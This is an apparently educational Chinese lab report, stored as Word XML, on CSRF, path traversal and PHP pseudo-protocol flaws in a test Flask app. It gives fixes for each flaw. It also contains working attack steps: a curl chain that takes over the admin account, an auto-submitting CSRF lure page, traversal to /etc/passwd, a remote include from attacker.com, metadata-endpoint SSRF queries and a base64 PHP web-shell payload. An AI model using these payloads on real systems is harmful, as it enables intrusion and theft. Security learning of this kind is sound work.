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48"/>
        </w:rPr>
        <w:t>今日学习内容漏洞分析报告</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>CSRF + 文件包含/路径穿越 + 伪协议</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>实验日期：2026年7月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rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第1章  CSRF跨站请求伪造漏洞（/change-password）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第2章  文件包含与路径穿越漏洞（/page）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第3章  伪协议知识（HTTP/data/php）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第4章  漏洞代码分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第5章  修复方案（含完整代码）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>第6章  修复前后代码对比</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第一章  CSRF跨站请求伪造漏洞（/change-password）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.1 漏洞概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>CSRF攻击诱导已登录用户访问恶意页面，利用用户登录状态执行非授权操作。漏洞点在POST /change-password。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.2 攻击链（4步）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alice登录 → CSRF改admin密码 → 新密码登录admin → 越权删用户carlos</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Step1：alice登录获取Cookie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-c /tmp/c.txt -X POST http://target/login -d 'username=alice&amp;password=alice2025'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step2：CSRF修改admin密码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-b /tmp/c.txt -X POST http://target/change-password -d 'username=admin&amp;new_password=hacked123'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step3：用新密码登录admin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-c /tmp/a.txt -X POST http://target/login -d 'username=admin&amp;password=hacked123'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Step4：越权删除用户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-b /tmp/a.txt -X POST http://target/admin/delete-user -d 'user_id=2'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1.3 Burp Suite CSRF PoC生成</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>拦截POST /change-password → 右键 → Generate CSRF PoC → 保存HTML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&lt;html&gt;&lt;body&gt;</w:t>
        <w:br/>
        <w:t>&lt;h1&gt;免费抽奖！点击领取&lt;/h1&gt;</w:t>
        <w:br/>
        <w:t>&lt;form action="http://target:5000/change-password" method="POST"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;input type="hidden" name="username" value="admin"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;input type="hidden" name="new_password" value="hacked123"&gt;</w:t>
        <w:br/>
        <w:t>&lt;/form&gt;</w:t>
        <w:br/>
        <w:t>&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</w:t>
        <w:br/>
        <w:t>&lt;/body&gt;&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第二章  文件包含与路径穿越漏洞（/page）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>漏洞路由：GET /page?name=参数，name直接拼接到文件路径，未过滤../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读取源码：     /page?name=../app.py</w:t>
        <w:br/>
        <w:t>下载数据库：   /page?name=../data/users.db</w:t>
        <w:br/>
        <w:t>读系统文件：   /page?name=../../../../../../etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第三章  伪协议知识</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 HTTP伪协议 → 内网扫描</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>利用文件包含请求远程URL，实现SSRF攻击和内网探测。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PHP远程文件包含</w:t>
        <w:br/>
        <w:t>include('http://attacker.com/shell.txt')</w:t>
        <w:br/>
        <w:br/>
        <w:t># Python内网扫描</w:t>
        <w:br/>
        <w:t>for i in range(1,255):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r = requests.get(f'http://192.168.1.{i}:80', timeout=1)</w:t>
        <w:br/>
        <w:br/>
        <w:t># AWS元数据</w:t>
        <w:br/>
        <w:t>curl http://169.254.169.254/latest/meta-data/local-ipv4</w:t>
        <w:br/>
        <w:br/>
        <w:t># 阿里云元数据</w:t>
        <w:br/>
        <w:t>curl http://100.100.100.200/latest/meta-data/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 data伪协议 → 代码执行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PHP: include('data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==')</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 php://伪协议 → 读取源码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php://filter/read=convert.base64-encode/resource=config.php</w:t>
        <w:br/>
        <w:t># php://input + POST body执行代码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第四章  漏洞代码分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 /change-password漏洞代码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@app.route("/change-password", methods=["POST"])</w:t>
        <w:br/>
        <w:t>def change_password():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    username = request.form.get("username", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    new_password = request.form.get("new_password", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # ⚠️ 无CSRF Token / 无原密码 / 越权改密 / 无Referer</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # ⚠️ SQL注入 + 明文存储</w:t>
        <w:br/>
        <w:t xml:space="preserve">    sql = f"UPDATE users SET password = '{new_password}' WHERE username = '{username}'"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    c.execute(sql); conn.commit()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 /page漏洞代码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@app.route("/page", methods=["GET"])</w:t>
        <w:br/>
        <w:t>def page():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name = request.args.get("name", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # ⚠️ 直接拼接路径，未过滤..</w:t>
        <w:br/>
        <w:t xml:space="preserve">    file_path = os.path.join("pages", name)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    with open(file_path, "r") as f: page_content = f.read()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第五章  修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 CSRF修复（三重防护）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修复1：CSRF Token</w:t>
        <w:br/>
        <w:t>session["csrf_token"] = uuid.uuid4().hex</w:t>
        <w:br/>
        <w:t>if token != session.get("csrf_token", ""): return "CSRF验证失败"</w:t>
        <w:br/>
        <w:br/>
        <w:t># 修复2：Session绑定</w:t>
        <w:br/>
        <w:t>if username != session["username"]: return "无权修改他人密码"</w:t>
        <w:br/>
        <w:br/>
        <w:t># 修复3：Referer验证</w:t>
        <w:br/>
        <w:t>if not referer.startswith(request.host_url): return "请求来源不合法"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 文件包含修复（三重防护）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修复1：白名单</w:t>
        <w:br/>
        <w:t>ALLOWED_PAGES = {"help", "about", "faq"}</w:t>
        <w:br/>
        <w:t>if name not in ALLOWED_PAGES: return "页面不存在"</w:t>
        <w:br/>
        <w:br/>
        <w:t># 修复2：过滤..符号</w:t>
        <w:br/>
        <w:t>if ".." in name: return "页面不存在"</w:t>
        <w:br/>
        <w:br/>
        <w:t># 修复3：路径规范化</w:t>
        <w:br/>
        <w:t>base = os.path.abspath("pages")</w:t>
        <w:br/>
        <w:t>req = os.path.abspath(os.path.join("pages", name))</w:t>
        <w:br/>
        <w:t>if not req.startswith(base): return "页面不存在"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>第六章  修复前后代码对比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有漏洞(app.py)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已修复(app_fixed.py)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CSRF Token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uuid+Session校验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越权改密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可改任何人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只能改自己的密码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Referer验证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验证Referer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SQL注入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字符串拼接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参数化查询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密码存储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明文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SHA256哈希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路径过滤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过滤..符号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白名单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无限制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白名单校验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路径校验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os.path.abspath校验</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="999999"/>
          <w:sz w:val="24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